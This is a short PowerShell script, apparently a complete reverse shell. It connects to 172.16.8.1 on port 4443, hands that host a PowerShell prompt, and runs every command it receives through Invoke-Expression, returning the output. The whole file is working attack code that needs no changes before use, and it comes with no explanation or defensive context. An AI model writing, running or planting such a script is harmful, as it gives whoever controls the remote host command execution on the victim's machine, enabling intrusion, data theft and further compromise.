$ip = '172.16.8.1'
$port = 4443

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

function Execute-Command {
    param (
        [string]$cmd
    )
    try {
        $result = Invoke-Expression $cmd 2>&1 | Out-String
    } catch {
        $result = $_.Exception.Message
    }
    return $result
}

while ($client.Connected) {
    $currentDir = (Get-Location).Path
    $writer.Write("PS $currentDir> ")
    $cmd = $reader.ReadLine()
    if ($cmd -eq 'exit') { break }
    $result = Execute-Command -cmd $cmd
    $writer.WriteLine($result)
}

$writer.Close()
$reader.Close()
$client.Close()